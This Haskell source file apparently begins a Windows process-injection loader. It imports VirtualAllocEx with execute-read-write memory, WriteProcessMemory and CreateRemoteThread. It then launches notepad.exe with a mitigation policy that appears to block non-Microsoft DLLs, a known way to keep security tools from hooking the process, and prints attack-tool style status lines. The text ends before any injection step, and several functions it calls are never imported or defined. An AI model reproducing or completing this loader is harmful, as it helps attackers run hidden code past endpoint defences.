import System.Win32.Process (openProcess, ProcessAccessRights, pROCESS_ALL_ACCESS)
import System.Win32.Mem (virtualAllocEx, pAGE_EXECUTE_READWRITE, mEM_COMMIT, mEM_RESERVE, createRemoteThread)
import System.Win32.DebugApi (c_WriteProcessMemory)
import System.Win32.Types (nullPtr, DWORD, LPCSTR, WORD, LPBYTE, HANDLE, BOOL, DWORD64, getLastError)
import System.Win32.File
import Data.ByteString.Internal (create)
import Data.Word (Word8)
import Foreign (Ptr)
import Foreign.Storable (poke, peek, sizeOf, peekElemOff)
import Foreign.Marshal.Array (pokeArray)
import Foreign.Marshal.Alloc (allocaBytes, alloca)
import Data.ByteString as B
import Text.Printf
import Foreign.C.String (newCString)
import System.Win32.Event (c_WaitForSingleObject)
import System.Win32.Process (iNFINITE)

import System.Environment


main :: IO ()
main = do
  alloca $ \ptr1 -> do
      let cb' = 400 :: DWORD
      let lpReserved' = nullPtr :: LPCSTR
      let lpDesktop' = nullPtr :: LPCSTR
      let lpTitle' = nullPtr :: LPCSTR
      let dwX' = 0 :: DWORD
      let dwY' = 0 :: DWORD
      let dwXSize' = 0 :: DWORD
      let dwYSize' = 0 :: DWORD
      let dwXCount' = 0 :: DWORD
      let dwYCount' = 0 :: DWORD
      let dwFillAttribute' = 0 :: DWORD
      let dwFlags' = eXTENDED_STARTUPINFO_PRESENT :: DWORD
      let wShowWindow' = 0 :: Word
      let cbReserved' = 0 :: Word
      let lpReserved2' = nullPtr :: LPBYTE
      let hStdInput' = nullPtr :: HANDLE
      let hStdOutput' = nullPtr :: HANDLE
      let hStdError' = nullPtr :: HANDLE

      poke ptr1 $ STARTUPINFOA cb' lpReserved' lpDesktop' lpTitle' dwX' dwY' dwXSize' dwYSize' dwXCount' dwYCount' dwFillAttribute' dwFlags' wShowWindow' cbReserved' lpReserved2' hStdInput' hStdOutput' hStdError'


      alloca $ \sizePtr -> do
        init1_result <- c_InitializeProcThreadAttributeList nullPtr 1 0 sizePtr
        Prelude.putStrLn "[+] Got attribute list size"

        allocaBytes 48 $ \attrListPtr -> do
          init2_result <- c_InitializeProcThreadAttributeList attrListPtr 1 0 sizePtr
          Prelude.putStrLn "[+] Initialized attribute list"

          alloca $ \policyPtr -> do
            poke policyPtr $ (0x100000000000 :: DWORD64)
            update_result <- c_UpdateProcThreadAttribute attrListPtr 0 0x20007 policyPtr 8 nullPtr nullPtr
            Prelude.putStrLn "[+] Updated proc thread attribute"

          alloca $ \startupInfoExPtr -> do
            poke startupInfoExPtr $ STARTUPINFOEXA ptr1 attrListPtr
            Prelude.putStrLn "[+] Allocated STARTUPINFOEXA"

            alloca $ \ptr2 -> do
              let hProcess' = nullPtr :: HANDLE
              let hThread' = nullPtr :: HANDLE
              let dwProcessId' = 0 :: DWORD
              let dwThreadId' = 0 :: DWORD

              poke ptr2 $ PROCESS_INFORMATION hProcess' hThread' dwProcessId' dwThreadId'

              newC <- newCString "C:\\Windows\\System32\\notepad.exe"
              Prelude.putStrLn "[+] Starting process"
              c_CreateProcess nullPtr newC nullPtr nullPtr True 0x00080000 nullPtr nullPtr startupInfoExPtr ptr2
              Prelude.putStrLn "[+] Process started!"
